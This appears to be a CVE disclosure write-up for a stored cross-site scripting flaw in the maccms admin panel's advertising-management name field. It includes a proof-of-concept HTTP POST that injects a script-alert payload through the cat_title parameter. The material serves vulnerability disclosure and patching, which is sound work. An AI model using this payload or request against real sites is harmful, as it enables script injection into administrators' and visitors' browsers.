# CVE-2022-44870
maccms  admin+  xss attacks 

Overview

Manufacturer's website information：https://maccms.pro 

Source code download address ： https://github.com/maccmspro/maccms10.git


1. Affected version: V2021.1000.2000
<img width="1378" alt="图片" src="https://user-images.githubusercontent.com/42855430/210311818-bd14b19d-2fbc-41ba-b426-7bc26cc9a6bd.png">

2.Vulnerability details

https://github.com/maccmspro/maccms10/issues/23

Go to background, go to Basics > AD Management > Name,

Insert payload1 in the name box:

It can cause XSS attacks.

Vulnerability name：Storage type xss

Vulnerability level：Medium risk

Vulnerability location： Advertising management-->name

Insert <script>alert(1)</script> at cat_title

http://127.0.0.1/admin.php/admin/banner/infocat.html


![图片](https://user-images.githubusercontent.com/42855430/208800465-615d032f-bc7a-4e03-93c4-5e551fde32bd.png)

<img width="862" alt="图片" src="https://user-images.githubusercontent.com/42855430/210314311-18e69b21-2da4-4eac-b87d-383a6d7d90d2.png">


3.Recurring vulnerabilities and POC



POST /admin.php/admin/banner/infocat.html HTTP/1.1

Host: 192.168.52.163

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0

Accept: */*

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 65

Origin: http://192.168.52.163

Connection: close

Referer: http://192.168.52.163/admin.php/admin/banner/infocat.html

Cookie: PHPSESSID=qgaks01bl6ip8j7fseaabj4l9q


cat_id=&cat_title=%3Cscript%3Ealert(1)%3C%2Fscript%3E&cat_code=111

![图片](https://user-images.githubusercontent.com/42855430/208800497-b5a3593c-d576-4ca2-9b8c-3718f4e7e1c6.png)



